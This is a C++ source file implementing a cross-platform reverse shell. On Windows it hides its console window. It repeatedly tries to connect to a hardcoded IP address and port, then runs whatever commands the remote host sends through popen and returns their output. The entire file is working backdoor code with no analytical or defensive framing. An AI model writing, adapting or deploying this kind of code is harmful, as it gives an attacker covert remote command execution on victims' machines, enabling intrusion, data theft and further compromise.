#include <iostream>
#include <string>
#include <cstring>
#include <sys/stat.h>
#include <sys/types.h>

#ifdef _WIN32
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#endif

void Shell(int sock)
{
    char buf[1024] = {'\0'};
    char server_message[1024] = {'\0'};
    char total_response[18384] = {'\0'};

    while (true)
    {
        buf[0] = '\0';
        server_message[0] = '\0';
        total_response[0] = '\0';

        recv(sock, buf, sizeof(buf), 0);
        std::cout << "Client: " << buf << std::endl;
        if (strcmp(buf, "q") == 0)
        {
#ifdef _WIN32
            closesocket(sock);
            WSACleanup();
#else
            close(sock);
#endif
            exit(2);
        }

        else if (strncmp("cd ", buf, 3) == 0)
        {
            chdir(buf + 3);
            strcat(total_response, "Directory changed to ");
            strcat(total_response, buf + 3);
            send(sock, total_response, sizeof(total_response), 0);
        }

        else
        {
            FILE *fp;
#ifdef _WIN32
            fp = _popen(buf, "r");
#else
            fp = popen(buf, "r");
#endif
            while (fgets(server_message, 1024, fp) != NULL)
            {
                strcat(total_response, server_message);
            }
            send(sock, total_response, sizeof(total_response), 0);
#ifdef _WIN32
            _pclose(fp);
#else
            pclose(fp);
#endif
        }
    }
}

int main()
{
#ifdef _WIN32
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
#endif

    struct sockaddr_in ServAddr;
    unsigned short ServPort = 9002;
    std::string ServIP = "172.28.91.166";

#ifdef _WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
    {
        exit(1);
    }
#endif

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        std::cout << "Error creating socket" << std::endl;
        exit(1);
    }

    memset(&ServAddr, 0, sizeof(ServAddr));
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP.c_str());
    ServAddr.sin_port = htons(ServPort);

    std::cout << "Connecting to server..." << std::endl;
    while (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0)
    {
        std::cout << "Error connecting to server" << std::endl;
#ifdef _WIN32
        Sleep(10);
#else
        sleep(1);
#endif
    }

    std::cout << "Connected to server" << std::endl;
    Shell(sock);

    return 0;
}
